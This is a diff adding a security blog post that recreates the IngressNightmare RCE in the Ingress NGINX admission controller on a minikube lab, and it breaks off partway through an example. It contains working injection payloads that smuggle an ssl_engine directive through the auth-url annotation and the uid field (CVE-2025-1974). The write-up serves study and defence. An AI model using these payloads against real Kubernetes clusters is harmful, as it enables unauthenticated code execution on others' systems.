@@ -1,0 +1,1382 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Exploiting IngressNightmare: A Deep Dive">
+  <meta name="twitter:description" content="Wiz recently discovered an unauthenticated remote code execution (RCE) vulnerability in the Ingress NGINX admission controller. I found the exploit chain particularly intriguing and decided to recreate it for a deeper understanding.
+I want to thank my employer CODE WHITE for the permission to publish this post. As part of our Security Intelligence Service, we identified, exploited, and quickly remediated this vulnerability on systems within our clients’ scope.
+Introduction to Kubernetes Ingress and Admission Controllers In Kubernetes, an Ingress resource is used to manage external access to services within a cluster, typically by routing HTTP/HTTPS traffic based on defined rules.">
+
+    <link rel="alternate" type="application/rss+xml" href="https://blog.flomb.net//index.xml" title="Flomb Blog">
+
+    <title>Exploiting IngressNightmare: A Deep Dive - Flomb Blog</title>
+
+    
+    
+    <meta name="description" content="Wiz recently discovered an unauthenticated remote code execution (RCE) vulnerability in the Ingress NGINX admission controller. I found the exploit chain particularly intriguing and decided to recreate it for a deeper understanding.
+I want to thank my employer CODE WHITE for the permission to publish this post. As part of our Security Intelligence Service, we identified, exploited, and quickly remediated this vulnerability on systems within our clients&rsquo; scope.
+Introduction to Kubernetes Ingress and Admission Controllers In Kubernetes, an Ingress resource is used to manage external access to services within a cluster, typically by routing HTTP/HTTPS traffic based on defined rules." />
+    <meta name="author" content="" />
+    
+
+    <link href="/js/normal.css" rel="stylesheet">
+    <script src="/js/style@1.5.0"></script>
+    <script src="/js/themes.js"></script>
+    <script src="/js/styles@1.13.0"></script>
+    <script src="/js/master-styles-group"></script>
+    <script>window.themes = window.themes || new window.Themes()</script>
+
+    <style>
+        :root {
+            --font-sans: "Inter var", ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
+        }
+    </style></head>
+<body class="bg:fade-84@dark font:fade-16@dark font:sans">
+    <nav class="w:full h:90 fixed bg:fade-84/.95@dark bg:white z:1000">
+    <div class="
+        h:full
+        w:full
+        max-w:1200
+        mx:auto
+        d:flex
+        align-items:center
+    ">
+        <div>
+            <a href="/" class="mr-3 font:extralight">
+              
+              Flomb Blog
+              
+            </a>
+        </div>
+
+        <div class="ml:auto">
+            
+            
+            
+            
+            <a class="
+                font:semibold
+                font:fade
+                font:fade-10:hover
+                font:fade-30.active
+                px:8
+                transition:150ms;ease-in
+                
+            " href="/about/" title="">About</a>
+            
+        </div>
+    </div>
+</nav>
+<div class="d:flex flex:column@<=sm pt:90 jc:center gap:44 word-break:break-word">
+        <div class="max-w:1200 w:full box:content-box">
+            <style>
+                div.highlight pre {
+                    white-space: pre-wrap;
+                    word-break: break-word;
+                    font-size: large;
+                    }
+            </style>
+<article class="box:border-box pt:32">
+    <header class="mb:32">
+        <div class="font:40 font:extrabold">Exploiting IngressNightmare: A Deep Dive</div>
+        <div class="mt:16 f:fade-60">
+            <time>Mar 31, 2025</time>
+            </div>
+    </header><div class="
+    _:where(a):hover{text-decoration-color:fade}
+    _:where(a){text-decoration:2;underline;fade-10;_text-decoration-color:fade-70@dark}
+    _:where(blockquote){bl:5;solid;fade-76/.1;_bl:5;solid;fade-34/.1@dark}
+    _:where(code){font:90%;_v:middle}
+    _:where(code:not(.highlight_*,pre_*)){p:2;6;_r:4}
+    _:where(del){text-decoration:1;line-through;fade-68;_text-decoration-color:red-64@dark}
+    _:where(figcaption){text:14;_p:10;20;0;_width:fit;_mx:auto;_font:fade-56;_font:fade-57@dark}
+    _:where(h1){font:40;_font:extrabold}
+    _:where(h1,h2,h3)+:where(h1,h2,h3){mt:.5em}
+    _:where(h1,h2,h3,h4,h5,h6){mt:2em}
+    _:where(h2){mb:1em;_font:32}
+    _:where(h3){font:24}
+    _:where(h4){font:20}
+    _:where(h5){font:16}
+    _:where(h6){font:14}
+    _:where(li)::marker{font:fade-44;_font:fade-68@dark}
+    _:where(li){pl:.375em}
+    _:where(mark){text-decoration:1;underline;#fce016;_bg:transparent;_text-decoration-color:rgb(252;224;22/.5)@dark}
+    _:where(p,li){font:fade-76;_font:16;_line-height:1.65;_font:fade-34@dark}
+    _:where(p,pre,blockquote,figure,ul,ol,table){my:1.125em}
+    >:first-child{mt:0!}
+    _:where(pre){p:20;_r:8;_overflow:auto}
+    _:where(pre,code:not(.highlight_*)){bg:fade-2;_bg:fade-92!@dark}
+    _:where(strong,b,a,code:not(.highlight_*),mark,del){font:fade-92;_font:fade-12@dark}
+    _:where(table){width:full;_border-spacing:0}
+    _:where(td){v:baseline}
+    _:where(td,th):first-child{pl:0}
+    _:where(td,th):last-child{pr:0}
+    _:where(td,th){bb:1;solid;fade-92/.06;_p:6;_b:fade-4/.04@dark}
+    _:where(th){font:fade-78;_font:14;_text:left;_font:fade-12@dark}
+    _:where(th,p_code,li_code,a,mark){font:semibold;_font:medium@dark}
+    _:where(ul){list-style-type:disc}
+    _:where(ul,ol,blockquote){pl:1.5em}
+    _:where(video,img){max-width:full}
+    _:where(a,mark){text-underline-offset:3}
+    _:where(hr){h:2;_bg:fade-10;_bg:fade-70@dark;_my:3em}
+"><p>Wiz recently <a href="https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities">discovered</a> an unauthenticated remote code execution (RCE) vulnerability in the <a href="https://github.com/kubernetes/ingress-nginx">Ingress NGINX</a> admission controller. I found the exploit chain particularly intriguing and decided to recreate it for a deeper understanding.</p>
+<p>I want to thank my employer <a href="https://code-white.com/">CODE WHITE</a> for the permission to publish this post. As part of our Security Intelligence Service, we identified, exploited, and quickly remediated this vulnerability on systems within our clients&rsquo; scope.</p>
+<h3 id="introduction-to-kubernetes-ingress-and-admission-controllers">Introduction to Kubernetes Ingress and Admission Controllers</h3>
+<p>In Kubernetes, an <a href="https://kubernetes.io/docs/concepts/services-networking/ingress/">Ingress resource</a> is used to manage external access to services within a cluster, typically by routing HTTP/HTTPS traffic based on defined rules.</p>
+<p>Kubernetes operates on a declarative model, where the desired state of the system is defined through API objects. To enforce policies and modify these objects, <a href="https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/">admission controllers</a> are employed.</p>
+<p>The following diagram illustrates the flow of a request to the Kubernetes API server and highlights the role of mutating and validating admission controllers:
+<img src="api_chain.png" alt=""></p>
+<p>Kubernetes API objects, in themselves, are simply declarative representations of desired state. Their actual implementation is managed by <a href="https://kubernetes.io/docs/concepts/architecture/controller/">controllers</a>. These are control loops, typically implemented as binaries running within pods, that continuously monitor the state of their assigned resources. When changes are detected, controllers take actions to reconcile the actual state with the desired state specified in the API objects.
+This decoupled architecture allows for extensibility, where functionalities are implemented as plugins rather than being baked into the core Kubernetes system (e.g. <a href="https://github.com/container-storage-interface/spec/blob/master/spec.md">CSI</a>, <a href="https://kubernetes.io/docs/concepts/architecture/cri/">CRI</a>, <a href="https://github.com/containernetworking/cni">CNI</a> ). This is also true for Ingress resources, which is why Ingress NGINX exists.</p>
+<p>Ingress NGINX, officially maintained and developed by the Kubernetes community, is a popular implementation of an Ingress controller. As its name suggests, it leverages the widely used Nginx web server and reverse proxy to handle the routing of external traffic into the cluster based on the rules defined in Ingress resources.</p>
+<p>The IngressNightmare vulnerability affects the admission controller component of Ingress NGINX which is responsible for validating incoming Nginx configurations. It accomplishes this by creating a temporary config file that is then validated by the <code>nginx</code> command similar to the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nginx -t -c /tmp/nginx-cfg1217030255
+</span></span></code></pre></div><p>By default, the admission controller is accessible without authentication. Additionally, due to improper filtering, an attacker can inject arbitrary Nginx configuration directives, including <a href="https://nginx.org/en/docs/ngx_core_module.html#ssl_engine"><code>ssl_engine</code></a> which allows loading a shared library. This malicious library, containing the attacker&rsquo;s arbitrary code, can be provided by issuing a request with a large body and keeping the connection open. In this scenario, Nginx buffers the received data into a temporary file that can then be referenced in the injected Nginx configuration, leading to the library being loaded and executed.</p>
+<h3 id="lab-setup">Lab Setup</h3>
+<p>Let&rsquo;s start by building a test environment. I prefer <a href="https://minikube.sigs.k8s.io/docs/start/">minikube</a> for any local Kubernetes testing, and it conveniently supports Ingress NGINX after enabling the addon:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>minikube addons enable ingress
+</span></span></code></pre></div><p>Using the following command, we can then identify the Ingress NGINX admission controller:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ kubectl get validatingwebhookconfigurations -A -o yaml
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>    creationTimestamp: <span style="color:#e6db74">&#34;2025-03-25T10:46:38Z&#34;</span>
+</span></span><span style="display:flex;"><span>    generation: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    labels:
+</span></span><span style="display:flex;"><span>      app.kubernetes.io/component: admission-webhook
+</span></span><span style="display:flex;"><span>      app.kubernetes.io/instance: ingress-nginx
+</span></span><span style="display:flex;"><span>      app.kubernetes.io/name: ingress-nginx
+</span></span><span style="display:flex;"><span>    name: ingress-nginx-admission
+</span></span><span style="display:flex;"><span>    resourceVersion: <span style="color:#e6db74">&#34;115237&#34;</span>
+</span></span><span style="display:flex;"><span>    uid: 91f56c87-8593-4816-9b43-2c67f154c3e3
+</span></span><span style="display:flex;"><span>  webhooks:
+</span></span><span style="display:flex;"><span>  - admissionReviewVersions:
+</span></span><span style="display:flex;"><span>    - v1
+</span></span><span style="display:flex;"><span>    clientConfig:
+</span></span><span style="display:flex;"><span>      caBundle: LS0tLS1CRUdJTiBDR...
+</span></span><span style="display:flex;"><span>      service:
+</span></span><span style="display:flex;"><span>        name: ingress-nginx-controller-admission
+</span></span><span style="display:flex;"><span>        namespace: ingress-nginx
+</span></span><span style="display:flex;"><span>        path: /networking/v1/ingresses
+</span></span><span style="display:flex;"><span>        port: <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>..
+</span></span></code></pre></div><p>This output (<code>webhooks.clientConfig.service</code>) the service responsible for routing traffic to the controller. The <code>kubectl port-forward</code> command grants local access to the controller, simplifying interaction:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl port-forward -n ingress-nginx  service/ingress-nginx-controller-admission  8888:443
+</span></span></code></pre></div><p>Using the <code>path</code> specified in the <code>ValidatingWebhookConfiguration</code> above, we can now send a request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -iksw <span style="color:#e6db74">&#39;%{certs}&#39;</span> https://127.0.0.1:8888/networking/v1/ingresses
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
+</span></span><span style="display:flex;"><span>Date: Sat, <span style="color:#ae81ff">29</span> Mar <span style="color:#ae81ff">2025</span> 11:32:39 GMT
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Subject:O <span style="color:#f92672">=</span> nil2
+</span></span><span style="display:flex;"><span>Issuer:O <span style="color:#f92672">=</span> nil1
+</span></span><span style="display:flex;"><span>..
+</span></span><span style="display:flex;"><span>X509v3 Subject Alternative Name:DNS:ingress-nginx-controller-admission, DNS:ingress-nginx-controller-admission.ingress-nginx.svc
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>While the request fails (expecting a POST with an <code>AdmissionReview</code> body), this confirms connectivity and looks similar to the checks in the <a href="https://gist.github.com/nirohfeld/7a7c82c62321de9c2ef95d266b241fcb">nuclei template provided by Wiz</a>. Let&rsquo;s continue by creating a request containing a valid <code>AdmissionReview</code>. This can be done using the following <a href="https://kubernetes.io/docs/tasks/access-application-cluster/ingress-minikube/#create-an-ingress">example Ingress specification</a> together with the <a href="https://github.com/anderseknert/kube-review">kube-review tool</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">networking.k8s.io/v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Ingress</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">example-ingress</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">ingressClassName</span>: <span style="color:#ae81ff">nginx</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">rules</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">host</span>: <span style="color:#ae81ff">hello-world.com</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">http</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">paths</span>:
+</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">pathType</span>: <span style="color:#ae81ff">Prefix</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">backend</span>:
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">service</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">name</span>: <span style="color:#ae81ff">web</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">port</span>:
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">number</span>: <span style="color:#ae81ff">8080</span>
+</span></span></code></pre></div><p>Use the following commands to create and send a valid request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./kube-review create example_ingress.yaml &gt; example_ingress.json <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>curl -k https://127.0.0.1:8888/networking/v1/ingresses -i -X POST --json @example_ingress.json
+</span></span></code></pre></div><p>The response is rather verbose, but the key part (<code>&quot;allowed&quot;: true</code>) shows our Ingress configuration would have been accepted:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#960050;background-color:#1e0010">OK</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Date:</span> <span style="color:#960050;background-color:#1e0010">Sat,</span> <span style="color:#ae81ff">29</span> <span style="color:#960050;background-color:#1e0010">Mar</span> <span style="color:#ae81ff">2025</span> <span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">43</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">29</span> <span style="color:#960050;background-color:#1e0010">GMT</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length:</span> <span style="color:#ae81ff">1804</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">text/plain;</span> <span style="color:#960050;background-color:#1e0010">charset=utf</span><span style="color:#ae81ff">-8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;kind&#34;</span>: <span style="color:#e6db74">&#34;AdmissionReview&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;apiVersion&#34;</span>: <span style="color:#e6db74">&#34;admission.k8s.io/v1&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;request&#34;</span>: {
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;response&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;uid&#34;</span>: <span style="color:#e6db74">&#34;1edd602a-0f85-48c3-91bc-66dd757451ef&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;allowed&#34;</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}                      
+</span></span></code></pre></div><p>For our next attempts, we should also monitor the log output of the admission controller using:</p>
+<pre tabindex="0"><code>kubectl logs -f -n ingress-nginx   deployment/ingress-nginx-controller  
+-------------------------------------------------------------------------------
+NGINX Ingress controller
+  Release:       v1.10.1
+  Build:         4fb5aac1dd3669daa3a14d9de3e3cdb371b4c518
+  Repository:    https://github.com/kubernetes/ingress-nginx
+  nginx version: nginx/1.25.3
+
+-------------------------------------------------------------------------------
+...
+I0329 11:43:29.219318       7 admission.go:149] processed ingress via admission controller {testedIngressLength:2 testedIngressTime:0.024s renderingIngressLength:2 renderingIngressTime:0s admissionTime:0.024s testedConfigurationSize:22.0kB}
+I0329 11:43:29.219351       7 main.go:107] &#34;successfully validated configuration, accepting&#34; ingress=&#34;/example-ingress&#34;
+</code></pre><h3 id="configuration-injection">Configuration Injection</h3>
+<p>We can now attempt to inject directives into the Nginx configuration by adding a <code>nginx.ingress.kubernetes.io/auth-url</code> annotation to our ingress resource:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">networking.k8s.io/v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Ingress</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">example-ingress</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">annotations</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">nginx.ingress.kubernetes.io/auth-url</span>: <span style="color:#e6db74">&#34;http://example.com/#;\ninjection_point&#34;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">ingressClassName</span>: <span style="color:#ae81ff">nginx</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">rules</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">host</span>: <span style="color:#ae81ff">hello-world.com</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./kube-review create example_ingress.yaml &gt; example_ingress.json <span style="color:#f92672">&amp;&amp;</span> curl -k https://127.0.0.1:8888/networking/v1/ingresses -i -X POST --json @example_ingress.json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Date: Sat, <span style="color:#ae81ff">29</span> Mar <span style="color:#ae81ff">2025</span> 11:48:58 GMT
+</span></span><span style="display:flex;"><span>Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>Transfer-Encoding: chunked
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------------------------------------------------------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Error: exit status 1</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2025/03/29 11:48:58 [emerg] 230#230: unknown directive \&#34;injection_point\&#34; in /tmp/nginx/nginx-cfg2090142930:495</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># nginx: [emerg] unknown directive \&#34;injection_point\&#34; in /tmp/nginx/nginx-cfg2090142930:495</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># nginx: configuration file /tmp/nginx/nginx-cfg2090142930 test failed</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -------------------------------------------------------------------------------</span>
+</span></span></code></pre></div><p>This response points us to the generated temporary config file (<code>/tmp/nginx/nginx-cfg2090142930</code>), which we can inspect to better understand the injection. Usually, I would do so using the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl exec -it -n ingress-nginx  deployment/ingress-nginx-controller  -- bash
+</span></span><span style="display:flex;"><span>ingress-nginx-controller-768f948f8f-rbxzs:/etc/nginx$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>101<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>82<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>82<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>The default <code>www-data</code> user, however, has limited privileges inside the container. To make investigating more convenient, I created a debugging container in the same network and process namespace as the admission controller using these commands on the Minikube node:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>minikube ssh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>docker@minikube:~$ docker ps <span style="color:#75715e"># Find the target container ID</span>
+</span></span><span style="display:flex;"><span>CONTAINER ID   IMAGE                       COMMAND                  CREATED          STATUS          PORTS     NAMES
+</span></span><span style="display:flex;"><span>ce0c87e98055   ee54966f3891                <span style="color:#e6db74">&#34;/usr/bin/dumb-init …&#34;</span>   <span style="color:#ae81ff">31</span> minutes ago   Up <span style="color:#ae81ff">31</span> minutes             k8s_controller_ingress-nginx-controller-768f948f8f-rbxzs_ingress-nginx_0e18a13b-9d1b-4f4d-b791-cd91d387fe73_1
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>docker@minikube:~$ docker run -it --rm --pid<span style="color:#f92672">=</span>container:ce0c87e98055 --network<span style="color:#f92672">=</span>container:ce0c87e98055 --privileged debian bash <span style="color:#75715e"># Start debug container</span>
+</span></span></code></pre></div><p>From within this privileged container, we can now see the <code>nginx-ingress-controller</code> binary (PID 7) that runs the admission controller, as well as the Nginx worker processes that power the Ingress proxy itself:</p>
+<pre tabindex="0"><code>root@ingress-nginx-controller-768f948f8f-rbxzs:/# ps auxww
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+101            1  0.0  0.0    220     0 ?        Ss   11:26   0:00 /usr/bin/dumb-init -- /nginx-ingress-controller --election-id=ingress-nginx-leader --controller-class=k8s.io/ingress-nginx --watch-ingress-without-class=true --configmap=ingress-nginx/ingress-nginx-controller --tcp-services-configmap=ingress-nginx/tcp-services --udp-services-configmap=ingress-nginx/udp-services --validating-webhook=:8443 --validating-webhook-certificate=/usr/local/certificates/cert --validating-webhook-key=/usr/local/certificates/key
+101            7  0.0  0.2 1270560 43296 ?       Ssl  11:26   0:01 /nginx-ingress-controller --election-id=ingress-nginx-leader --controller-class=k8s.io/ingress-nginx --watch-ingress-without-class=true --configmap=ingress-nginx/ingress-nginx-controller --tcp-services-configmap=ingress-nginx/tcp-services --udp-services-configmap=ingress-nginx/udp-services --validating-webhook=:8443 --validating-webhook-certificate=/usr/local/certificates/cert --validating-webhook-key=/usr/local/certificates/key
+101           25  0.0  0.0 121076 10908 ?        S    11:27   0:00 nginx: master process /usr/bin/nginx -c /etc/nginx/nginx.conf
+101           29  0.0  0.0 133344 15804 ?        Sl   11:27   0:00 nginx: worker process
+101           30  0.0  0.0 133344 15780 ?        Sl   11:27   0:00 nginx: worker process
+...
+</code></pre><p>Using the proc filesystem, we can check the previously created configuration file to see that the injection appears in one of several <code>location</code> blocks:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@ingress-nginx-controller-768f948f8f-rbxzs:/# cat /proc/1/cwd/tmp/nginx/nginx-cfg2090142930 | grep -C <span style="color:#ae81ff">6</span> <span style="color:#e6db74">&#34;injection&#34;</span>
+</span></span><span style="display:flex;"><span>            client_max_body_size        1m;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Pass the extracted client certificate to the auth provider</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            proxy_http_version 1.1;
+</span></span><span style="display:flex;"><span>            set $target http://example.com/#;
+</span></span><span style="display:flex;"><span>            injection_point;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            proxy_pass $target;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    location / <span style="color:#f92672">{</span>
+</span></span></code></pre></div><p><em>(Full file can be found in <a href="#Annex">annex</a>)</em></p>
+<p>Simply replacing <code>injection_point</code> with <code>ssl_engine</code> yields an error:</p>
+<pre tabindex="0"><code>2025/03/29 12:10:30 [emerg] 3798#3798: &#34;ssl_engine&#34; directive is not allowed here in /tmp/nginx/nginx-cfg1407591265:495
+</code></pre><p>This is expected, as the <a href="https://nginx.org/en/docs/ngx_core_module.html#ssl_engine">Nginx documentation</a> mentions that this directive is allowed only in the main context. An Nginx configuration has a hierarchical structure, and <code>ssl_engine</code> must be placed at the top level (main context), not nested within a <code>server</code> or <code>location</code> block:</p>
+<p><img src="./nginx_config.png" alt=""></p>
+<p>Therefore, we need to inject additional closing brackets to escape into the main context:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">networking.k8s.io/v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Ingress</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">example-ingress</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">annotations</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">nginx.ingress.kubernetes.io/auth-url</span>: <span style="color:#e6db74">&#34;http://example.com/#;\n}}}ssl_engine /etc/hostname&#34;</span> 
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>From the error message, we can deduce that it worked and that there was an attempt to load the specified file:</p>
+<pre tabindex="0"><code>nginx: [emerg] ENGINE_by_id(&#34;/etc/hostname&#34;) failed (SSL: error:12800067:DSO support routines::could not load the shared library:filename(/etc/hostname): Error loading shared library /etc/hostname: Exec format error error:12800067:DSO support routines::could not load the shared library error:13000084:engine routines::dso not found error:13000074:engine routines::no such engine:id=/etc/hostname)
+</code></pre><p>After some additional iterations, I also recreated CVE-2025-1974 which results in the same impact:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">networking.k8s.io/v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Ingress</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">example-ingress</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">uid</span>: <span style="color:#e6db74">&#34;{\n}}}\nssl_engine /proc/PROC/fd/FD;\n&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">annotations</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">nginx.ingress.kubernetes.io/mirror-target</span>: <span style="color:#e6db74">&#34;https://127.0.0.1:443&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
